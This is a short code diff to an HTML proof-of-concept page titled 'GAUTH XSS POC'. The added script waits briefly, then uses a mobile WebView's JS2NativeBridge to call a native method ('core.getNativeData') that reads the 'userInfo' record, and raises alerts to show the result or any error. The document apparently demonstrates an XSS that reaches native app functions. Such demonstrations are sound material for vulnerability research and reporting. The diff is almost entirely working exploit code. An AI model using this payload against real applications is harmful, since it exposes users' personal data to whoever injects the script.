@@ -4,6 +4,20 @@
     <h1>GAUTH XSS POC</h1>
     <script>
       alert("WebView controlled");
+
+      setTimeout(function () {
+        if (window.JS2NativeBridge && JS2NativeBridge._invokeMethod) {
+          try {
+            JS2NativeBridge._invokeMethod(
+              '{"func":"core.getNativeData","params":{"key":"userInfo"},"__msg_type":"call","__callback_id":"9999"}'
+            );
+          } catch (e) {
+            alert("Bridge call error: " + e);
+          }
+        } else {
+          alert("JS2NativeBridge not available");
+        }
+      }, 2000);
     </script>
   </body>
 </html>
